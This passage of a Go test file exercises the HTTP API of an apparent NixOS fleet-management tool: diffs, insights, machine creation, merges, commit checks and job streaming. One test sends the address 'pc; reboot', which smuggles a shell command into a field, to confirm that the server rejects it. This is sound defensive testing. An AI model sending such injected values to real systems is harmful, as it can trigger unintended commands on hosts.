	if len(diff.Hosts) != 4 || diff.Hosts[3].Host != "workstation" || diff.Hosts[3].Status != "added" || diff.Hosts[3].Closure != nil {
		t.Fatalf("diff against nothing pushed %+v", diff)
	}
	if code := e.do(t, "GET", "/api/model/diff?against=tomorrow", nil, nil); code != 400 {
		t.Fatalf("unknown comparison: %d", code)
	}
}

func TestInsightsOverHTTP(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	var res struct {
		State    string
		Insights []core.Insight
	}
	e.ready(t, "/api/insights", &res)
	ids := map[string]bool{}
	for _, in := range res.Insights {
		ids[in.ID] = true
	}
	if !ids["eval-error"] || !ids["ssh-root-login"] || !ids["no-auto-gc"] {
		t.Fatalf("insights for the fixture fleet: %+v", res.Insights)
	}
}

func TestOptionValuesOverHTTP(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	var res struct {
		State  string
		Values []core.OptionValues
	}
	e.ready(t, "/api/fleet/values?name=nix.gc.automatic&name=zramSwap.enable&host=pi&host=homeserver", &res)
	if len(res.Values) != 2 || len(res.Values[0].Hosts) != 2 || res.Values[0].Name != "nix.gc.automatic" {
		t.Fatalf("values %+v", res)
	}
	if code := e.do(t, "GET", "/api/fleet/values?name=services.<name>.enable", nil, nil); code != 400 {
		t.Fatalf("placeholder name: %d", code)
	}
}

func TestCreateMachineOverHTTP(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	var res core.MachineCreated
	if code := e.do(t, "POST", "/api/machines", map[string]any{"name": "nas", "system": "x86_64-linux", "role": "server"}, &res); code != 200 || len(res.Files) != 3 {
		t.Fatalf("create: %d %+v", code, res)
	}
	if code := e.do(t, "POST", "/api/machines", map[string]any{"name": "nas", "system": "x86_64-linux", "role": "server"}, nil); code != 409 {
		t.Fatalf("duplicate: %d", code)
	}
	spec := map[string]any{"name": "pc", "system": "x86_64-linux", "role": "minimal", "disk": "btrfs", "device": "/dev/nvme0n1"}
	if code := e.do(t, "POST", "/api/machines", spec, &res); code != 200 || len(res.Files) != 4 || res.Files[2] != "hosts/pc/disk-config.nix" {
		t.Fatalf("create with a disk layout: %d %+v", code, res)
	}
	var er struct{ Error string }
	if code := e.do(t, "POST", "/api/hostkey", map[string]string{"address": "pc; reboot"}, &er); code != 400 || !strings.Contains(er.Error, "address") {
		t.Fatalf("host key of a bad address: %d %q", code, er.Error)
	}
}

// A working copy that does not evaluate cannot be compared: no "removed" machines.
func TestDiffOfABrokenWorkingCopy(t *testing.T) {
	e := fleetEnv(t)
	e.login(t)
	ctx := context.Background()
	if err := e.svc.Stage(ctx, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := e.svc.Commit(ctx, "machines", true); err != nil { // HEAD has every machine
		t.Fatal(err)
	}
	if _, err := e.svc.Write("BROKEN", "x\n", ""); err != nil {
		t.Fatal(err)
	}
	var diff struct {
		Error string
		Hosts []core.HostDiff
	}
	e.ready(t, "/api/model/diff", &diff)
	if diff.Error == "" || len(diff.Hosts) != 0 || strings.HasPrefix(diff.Error, "the flake does not evaluate") {
		t.Fatalf("diff of a broken working copy %+v", diff)
	}
}

func TestStaticAssetsAreCachedAndCompressed(t *testing.T) {
	e := newEnv(t)
	req, _ := http.NewRequest("GET", e.srv.URL+"/assets/app.js", nil)
	req.Header.Set("Accept-Encoding", "gzip")
	resp, err := (&http.Transport{DisableCompression: true}).RoundTrip(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.Header.Get("Content-Encoding") != "gzip" || !strings.Contains(resp.Header.Get("Cache-Control"), "immutable") || !strings.Contains(resp.Header.Get("Content-Type"), "javascript") {
		t.Fatalf("headers %v", resp.Header)
	}
	zr, err := gzip.NewReader(resp.Body)
	if err != nil {
		t.Fatal(err)
	}
	if b, _ := io.ReadAll(zr); string(b) != "js" {
		t.Fatalf("body %q", b)
	}
	idx, _ := http.Get(e.srv.URL + "/")
	idx.Body.Close()
	if !strings.Contains(idx.Header.Get("Cache-Control"), "no-cache") {
		t.Fatalf("index must not be cached: %v", idx.Header)
	}
}

func TestRevertAndMergeOverHTTP(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	ctx := context.Background()
	commit := func(path, content, msg string) string {
		cur := ""
		if _, h, err := e.svc.Read(path); err == nil {
			cur = h
		}
		if _, err := e.svc.Write(path, content, cur); err != nil {
			t.Fatal(err)
		}
		if err := e.svc.Stage(ctx, nil); err != nil {
			t.Fatal(err)
		}
		sha, err := e.svc.Commit(ctx, msg, true)
		if err != nil {
			t.Fatal(err)
		}
		return sha
	}
	commit("a.nix", "1\n", "one")
	two := commit("a.nix", "2\n", "two")
	if code := e.do(t, "POST", "/api/revert", map[string]string{"rev": two}, nil); code != 204 {
		t.Fatalf("revert: %d", code)
	}
	if c, _, _ := e.svc.Read("a.nix"); c != "1\n" {
		t.Fatalf("after revert %q", c)
	}
	if err := e.svc.Discard(ctx, []string{"a.nix"}); err != nil {
		t.Fatal(err)
	}
	if err := e.svc.Unstage(ctx, nil); err != nil {
		t.Fatal(err)
	}
	if err := e.svc.Discard(ctx, []string{"a.nix"}); err != nil {
		t.Fatal(err)
	}
	if err := e.svc.CreateBranch(ctx, "testing-pi", ""); err != nil {
		t.Fatal(err)
	}
	commit("pi.nix", "x\n", "pi")
	if err := e.svc.Switch(ctx, "main"); err != nil {
		t.Fatal(err)
	}
	var m struct{ Message string }
	if code := e.do(t, "POST", "/api/merge", map[string]string{"branch": "testing-pi"}, &m); code != 200 || !strings.Contains(m.Message, "testing-pi") {
		t.Fatalf("merge: %d %+v", code, m)
	}
}

// Trials answer over HTTP with the service's errors: here the flake has no
// such machine.
func TestTrialsOverHTTP(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	var m any
	e.ready(t, "/api/model?at=working", &m)
	var er struct{ Error string }
	if code := e.do(t, "POST", "/api/try", map[string]any{"host": "pi", "message": "try", "replace": true}, &er); code != 404 || !strings.Contains(er.Error, "pi") {
		t.Fatalf("try: %d %q", code, er.Error)
	}
	if code := e.do(t, "POST", "/api/try/end", map[string]string{"host": "pi"}, &er); code != 404 {
		t.Fatalf("end: %d %q", code, er.Error)
	}
}

func cookieHeader(cs []*http.Cookie) string {
	parts := make([]string, len(cs))
	for i, c := range cs {
		parts[i] = c.Name + "=" + c.Value
	}
	return strings.Join(parts, "; ")
}

// Health names the deployed commit that never passed a check, and the jobs API
// checks it.
func TestCheckACommitOverHTTP(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	ctx := context.Background()
	if _, err := e.svc.Write("flake.nix", "{ }\n", ""); err != nil {
		t.Fatal(err)
	}
	e.svc.Stage(ctx, nil)
	sha, err := e.svc.Commit(ctx, "unchecked", true)
	if err != nil {
		t.Fatal(err)
	}
	finding := func() *core.Insight {
		var res struct{ Insights []core.Insight }
		e.ready(t, "/api/insights", &res)
		for _, in := range res.Insights {
			if in.ID == "unchecked-commit" {
				return &in
			}
		}
		return nil
	}
	if in := finding(); in == nil || in.Fix == nil || in.Fix.Check != sha || in.Severity != "warning" {
		t.Fatalf("finding %+v", in)
	}
	if code := e.do(t, "POST", "/api/jobs", map[string]any{"kind": "check", "commit": sha, "targets": []string{"x"}}, nil); code != 400 {
		t.Fatalf("a commit with targets: %d", code)
	}
	var job struct{ ID string }
	if code := e.do(t, "POST", "/api/jobs", map[string]any{"kind": "check", "commit": sha}, &job); code != 200 {
		t.Fatalf("check the commit: %d", code)
	}
	j, _ := e.svc.Jobs.Get(job.ID)
	if info := j.Info(false); info.Commit != sha {
		t.Fatalf("job %+v", info)
	}
	<-j.Done()
	var jobs struct{ Jobs []core.JobInfo }
	e.do(t, "GET", "/api/jobs", nil, &jobs)
	if len(jobs.Jobs) == 0 || jobs.Jobs[0].Commit != sha || jobs.Jobs[0].State != "passed" {
		t.Fatalf("jobs %+v", jobs)
	}
	if in := finding(); in != nil {
		t.Fatalf("finding after the check %+v", in)
	}
	if code := e.do(t, "POST", "/api/jobs", map[string]any{"kind": "check", "commit": sha}, nil); code != 409 {
		t.Fatalf("checked again: %d", code)
	}
}

func TestCompleteRunes(t *testing.T) {
	for in, want := range map[string]string{
		"a\xffb":           "a\xffb", // a bad byte inside goes out, as U+FFFD
		"ab":               "ab",
		"ab\xe2\x82":       "ab", // € cut after two of its three bytes
		"ab\xe2\x82\xac":   "ab\xe2\x82\xac",
		"x\xf0\x9f\x98":    "x", // a four-byte character cut after three
		"\xf0\x9f\x98\x80": "\xf0\x9f\x98\x80",
		"a\xff":            "a\xff",
	} {
		if got := string(completeRunes([]byte(in))); got != want {
			t.Errorf("completeRunes(%q) = %q, want %q", in, got, want)
		}
	}
}

// A running job's output streams even with a byte that is not UTF-8 in it, as
// nix -L logs have: it comes as U+FFFD before the job ends.
func TestJobEventsStreamInvalidUTF8(t *testing.T) {
	e := newEnv(t)
	e.login(t)
	release := filepath.Join(t.TempDir(), "release")
	nix := filepath.Join(t.TempDir(), "nix")
	os.WriteFile(nix, []byte("#!/bin/sh\ncase \"$*\" in *\" hash path \"*) echo sha256-fake; exit ;; esac\n"+
		"case \"$*\" in *\"eval --json\"*) echo '{\"nixos\":[],\"home\":[],\"darwin\":[]}'; exit ;; esac\n"+
		"case \"$*\" in *\"flake check\"*) printf 'a\\377b\\n'; while [ ! -f '"+release+"' ]; do sleep 0.02; done ;; esac\n"), 0o755)
	e.svc.Jobs.Nix = nix
	var w struct{ Hash string }
	e.do(t, "GET", "/api/file?path=flake.nix", nil, &w)
	e.do(t, "PUT", "/api/file", map[string]string{"path": "flake.nix", "content": "{ }\n", "base_hash": w.Hash}, nil)
	e.do(t, "POST", "/api/stage", map[string]any{"paths": []string{}}, nil)
	var job struct{ ID string }
	if code := e.do(t, "POST", "/api/jobs", map[string]any{"kind": "check"}, &job); code != 200 {
		t.Fatalf("submit: %d", code)
	}
	defer os.WriteFile(release, nil, 0o644)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	req, _ := http.NewRequestWithContext(ctx, "GET", e.srv.URL+"/api/jobs/"+job.ID+"/events", nil)
	resp, err := e.client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	sc := bufio.NewScanner(resp.Body)
	for sc.Scan() {
		if strings.HasPrefix(sc.Text(), "event: done") {
			t.Fatal("done came before the output")
		}
		if strings.HasPrefix(sc.Text(), "data: ") && strings.Contains(sc.Text(), "a\\ufffdb") {
			return
		}
	}
	t.Fatalf("no output while the job ran: %v", sc.Err())
}
